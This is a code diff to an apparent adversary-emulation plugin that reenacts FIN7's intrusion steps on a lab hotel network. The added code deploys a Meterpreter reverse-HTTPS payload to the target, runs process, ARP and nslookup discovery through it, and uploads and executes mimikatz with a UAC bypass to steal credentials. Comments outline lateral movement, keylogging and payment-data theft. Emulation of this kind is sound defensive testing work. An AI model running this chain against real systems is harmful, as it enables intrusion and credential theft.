@@ -5,6 +5,7 @@
 from plugins.base.attack import AttackPlugin
 from app.interface_sfx import CommandlineColors
 from app.metasploit import MSFVenom, Metasploit
+import os
 
 
 class FIN7Plugin(AttackPlugin):
@@ -17,25 +18,38 @@ class FIN7Plugin(AttackPlugin):
 
     required_files_attacker = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
 
+    ######
+    payload_type_1 = "windows/x64/meterpreter/reverse_https"  # payload for initial stage
+
     def __init__(self):
         super().__init__()
         self.plugin_path = __file__
+        self.metasploit_1 = None
+
+    def get_metasploit_1(self):
+        """ Returns a metasploit with a session for the first targeted machine """
+        if self.metasploit_1:
+            return self.metasploit_1
+
+        self.metasploit_1 = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
+        self.metasploit_1.start_exploit_stub_for_external_payload(payload=self.payload_type_1)
+        return self.metasploit_1
 
     def step1(self):
-        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1: Initial Breach{CommandlineColors.ENDC}", 1)
+        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 1 (target hotelmanager): Initial Breach{CommandlineColors.ENDC}", 1)
         # TODOS: No idea if we can replicate that automated as those are manual tasks
 
         # RTF with VB payload (needs user interaction)
         # playoad executed by mshta
         # mshta build js payload
         # mshta copies wscript.exe to ADB156.exe
-        # winword.exe spawns verclsid.exe
+        # winword.exe spawns verclsid.exe (a normal tool that can download stuff, no idea yet what it is used for here)
         # mshta uses taskschd.dll to create a task in 5 minutes
 
         self.attack_logger.vprint(f"{CommandlineColors.OKGREEN}End Step 1: Initial Breach{CommandlineColors.ENDC}", 1)
 
     def step2(self):
-        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2: Delayed Malware Execution{CommandlineColors.ENDC}", 1)
+        self.attack_logger.vprint(f"{CommandlineColors.OKBLUE}Step 2 (target hotelmanager): Delayed Malware Execution{CommandlineColors.ENDC}", 1)
 
         # scheduled task spawns Adb156.exe via svchost https://attack.mitre.org/techniques/T1053/005/
         # Adb156.exe loads scrobj.dll and executes sql-rat.js via jscript https://attack.mitre.org/techniques/T1059/007/
@@ -46,7 +60,7 @@ class FIN7Plugin(AttackPlugin):
 
     def step3(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 3: Target Assessment{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 3 (target hotelmanager): Target Assessment{CommandlineColors.ENDC}", 1)
 
         # TODO: Make sure logging is nice and complete
 
@@ -94,7 +108,7 @@ class FIN7Plugin(AttackPlugin):
 
         """
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 4 (target hotelmanager): Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKCYAN}Create babymetal replacement{CommandlineColors.ENDC}",
@@ -103,7 +117,6 @@ class FIN7Plugin(AttackPlugin):
         # Generate payload:
 
         payload_name = "babymetal.exe"
-        payload_type = "windows/x64/meterpreter/reverse_https"
 
         # TODO: Babymetal payload is a dll. Currently we are using a simplification here (exe). Implement the proper steps. For the proper steps see:
         # Several steps are required https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7/Resources/Step4/babymetal
@@ -113,7 +126,7 @@ class FIN7Plugin(AttackPlugin):
         # --encrypt xor       : xor encrypt the results
         # --encrypt-key m     : the encryption key
         venom = MSFVenom(self.attacker_machine_plugin, self.targets[0], self.attack_logger)
-        venom.generate_and_deploy(payload=payload_type,
+        venom.generate_and_deploy(payload=self.payload_type_1,
                                   architecture="x64",
                                   platform="windows",
                                   lhost=self.attacker_machine_plugin.get_ip(),
@@ -138,34 +151,70 @@ class FIN7Plugin(AttackPlugin):
         # TODO: invoke-Shellcode.ps1 loads shellcode into powershell.exe memory (Allocate memory, copy shellcode, start thread)  (received from C2 server) https://attack.mitre.org/techniques/T1573/
         # https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin7/Resources/Step4/babymetal/Invoke-Shellcode.ps1
 
-        # Todo: Wait for meterpreter here
-        metasploit = Metasploit(self.metasploit_password, attacker=self.attacker_machine_plugin, username=self.metasploit_user)
-        metasploit.start_exploit_stub_for_external_payload(payload=payload_type)
-        print("Got session, calling command")
-        print(metasploit.meterpreter_execute_on(["getuid"], self.targets[0]))
+        # metasploit1 = self.get_metasploit_1()
+        # print("Got session, calling command")
+        # print(metasploit.meterpreter_execute_on(["getuid"], self.targets[0]))
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 4: Staging Interactive Toolkit{CommandlineColors.ENDC}", 1)
 
     def step5(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 5 (target hotelmanager): Escalate Privileges{CommandlineColors.ENDC}", 1)
 
         # This is meterpreter !
+        metasploit = self.get_metasploit_1()
 
         # powershell -> CreateToolHelp32Snapshot() for process discovery (Caldera alternative ?) https://attack.mitre.org/techniques/T1057/
+        self.attack_logger.vprint(f"{CommandlineColors.OKCYAN}Execute ps -ax through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on(["ps -ax"], self.targets[0]))
+
+        # powershell: GetIpNetTable() does ARP entries https://attack.mitre.org/techniques/T1016/
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute arp through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on(["arp"], self.targets[0]))
+        # powershell: nslookup to query domain controler(hoteldc) for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
+        # TODO: Add real <itadmin> ip
+        itadmin = "127.0.0.1"
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute nslookup through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([f"execute -f nslookup.exe -H -i -a '{itadmin}'"], self.targets[0]))
+
+        # Copy step 5 attack tools to attacker
+
         # powershell download from C2 server: samcat.exe (mimikatz) https://attack.mitre.org/techniques/T1507/
+        # tplayground = self.targets[0].get_playground()
+        # aplayground = self.attacker_machine_plugin.get_playground() or ""
+        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "samcat.exe"), "samcat.exe")
+        self.attacker_machine_plugin.put(os.path.join(os.path.dirname(self.plugin_path), "resources", "step5", "uac-samcats.ps1"), "uac-samcats.ps1")
+        cmd = "upload samcat.exe 'samcat.exe'  "
+        print(cmd)
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Uploading mimikatz through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))
+
+        cmd = "upload uac-samcats.ps1 'uac-samcats.ps1'  "
+        print(cmd)
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Uploading UAC bypass script through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([cmd], self.targets[0], delay=2))
+
         # execute uac-samcats.ps1 This: spawns a powershell from powershell -> samcat.exe as high integrity process https://attack.mitre.org/techniques/T1548/002/
+        execute_samcats = "execute -f powershell.exe -H -i -a '-c ./uac-samcats.ps1'"
+        print(execute_samcats)
+        self.attack_logger.vprint(
+            f"{CommandlineColors.OKCYAN}Execute UAC bypass (and mimikatz) through meterpreter{CommandlineColors.ENDC}", 1)
+        print(metasploit.meterpreter_execute_on([execute_samcats], self.targets[0], delay=20))
+        # TODO: Make it more reliable. Also test which OS versions are working properly. It worked at least once
+
         # samcat.exe: reads local credentials https://attack.mitre.org/techniques/T1003/001/
-        # powershell: GetIpNetTable() doe ARP entries (Caldera ?) https://attack.mitre.org/techniques/T1016/
-        # powershell: nslookup to query domain controler for ip from ARP (Caldera ?) https://attack.mitre.org/techniques/T1018/
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 5: Escalate Privileges{CommandlineColors.ENDC}", 1)
 
     def step6(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 6: Expand Access{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 6 (target hotelmanager -> itadmin): Expand Access{CommandlineColors.ENDC}", 1)
 
         # This is meterpreter !
 
@@ -173,6 +222,7 @@ class FIN7Plugin(AttackPlugin):
         # spawn powershell through cmd
         # !!! admin host!!! use password with paexec to move lateral to it admin host https://attack.mitre.org/techniques/T1021/002/
         # paexec  starts temorary windows service and executes hollow.exe https://attack.mitre.org/techniques/T1021/002/
+        # => Lateral move to itadmin
         # hollow.exe spawns svchost and unmaps memory image https://attack.mitre.org/techniques/T1055/012/
         # svchost starts data exchange
 
@@ -199,7 +249,7 @@ class FIN7Plugin(AttackPlugin):
 
     def step8(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 8: User Monitoring{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 8 (target: itadmin as domain_admin): User Monitoring{CommandlineColors.ENDC}", 1)
 
         # This is meterpreter !
 
@@ -207,13 +257,14 @@ class FIN7Plugin(AttackPlugin):
         # screenspy for screen capture https://attack.mitre.org/techniques/T1113/
         # migrate session to mstsc.exe https://attack.mitre.org/techniques/T1056/001/
         # deploy keylogger https://attack.mitre.org/techniques/T1056/001/
+        # create a RDP session from itadmin -> accounting using stolen credentials
 
         self.attack_logger.vprint(
             f"{CommandlineColors.OKGREEN}End Step 8: User Monitoring{CommandlineColors.ENDC}", 1)
 
     def step9(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 9: Setup Shim Persistence{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 9 (target: accounting): Setup Shim Persistence{CommandlineColors.ENDC}", 1)
 
         # This is meterpreter !
 
@@ -226,7 +277,7 @@ class FIN7Plugin(AttackPlugin):
 
     def step10(self):
         self.attack_logger.vprint(
-            f"{CommandlineColors.OKBLUE}Step 10: Steal Payment Data{CommandlineColors.ENDC}", 1)
+            f"{CommandlineColors.OKBLUE}Step 10 (target: accounting): Steal Payment Data{CommandlineColors.ENDC}", 1)
 
         # This is meterpreter !
 
